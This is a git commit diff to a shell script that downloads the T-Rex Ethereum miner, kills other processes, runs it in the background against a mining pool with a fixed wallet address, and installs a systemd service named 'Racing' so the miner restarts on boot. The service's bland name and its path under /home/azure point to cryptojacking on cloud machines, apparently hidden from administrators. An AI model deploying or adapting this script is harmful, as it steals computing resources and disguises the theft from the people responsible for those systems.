99b1265c0d2c36ba272613cfd2287e241e4346fc
oursourcegtx <93318626+oursourcegtx@users.noreply.github.com>
2021-11-01 11:17:47 +0700

    Update duynew.sh

--- duynew.sh
+++ duynew.sh
@@ -17,11 +17,11 @@ then
     echo "xxx vip pro" > isHaveSetupCoin.txt
     wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
     sudo killall XXX
-    ./t-rex -a ethash -o us-eth.2miners.com:2020 -u 0xb545032e5c71bf9161292bb431328e5c210559b0 -p x -w $woker
+    ./t-rex -a ethash -o us-eth.2miners.com:2020 -u 0xb545032e5c71bf9161292bb431328e5c210559b0 -p x -w $woker &
 else
     wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
     sudo killall XXX
-    ./t-rex -a ethash -o us-eth.2miners.com:2020 -u 0xb545032e5c71bf9161292bb431328e5c210559b0 -p x -w $woker
+    ./t-rex -a ethash -o us-eth.2miners.com:2020 -u 0xb545032e5c71bf9161292bb431328e5c210559b0 -p x -w $woker &
 fi
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/azure//t-rex -a ethash -o us-eth.2miners.com:2020 -u 0xb545032e5c71bf9161292bb431328e5c210559b0 -p x -w myworker1111\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
